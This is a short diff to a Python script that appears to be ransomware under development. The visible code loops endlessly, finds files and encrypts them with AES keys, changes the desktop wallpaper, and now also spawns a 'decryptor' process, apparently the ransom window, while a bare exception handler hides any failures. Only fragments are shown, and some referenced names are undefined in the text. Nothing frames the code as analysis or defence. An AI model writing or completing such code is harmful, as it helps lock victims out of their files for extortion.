@@ -54,7 +54,12 @@ def get_paths():
 
 
 def open_decryptor():
-    pass
+    if(decryptor_process_exists):
+        return
+    
+    spawn_new_process()
+
+
 
 
 def new_process():
@@ -139,11 +144,16 @@ def menu():
     new_files = get_files.find_files(test_path)
     aes_keys_and_base64_path = start_encryption(new_files)
     
+    # write at the end of the file 
 
 
 if __name__ == "__main__":
     while True:
-        menu()
-        time.sleep(30)
-        change_wallpaper()
+        try:
+            menu()
+            time.sleep(30)
+            change_wallpaper()
+            open_decryptor()
+        except:
+            pass
     pass
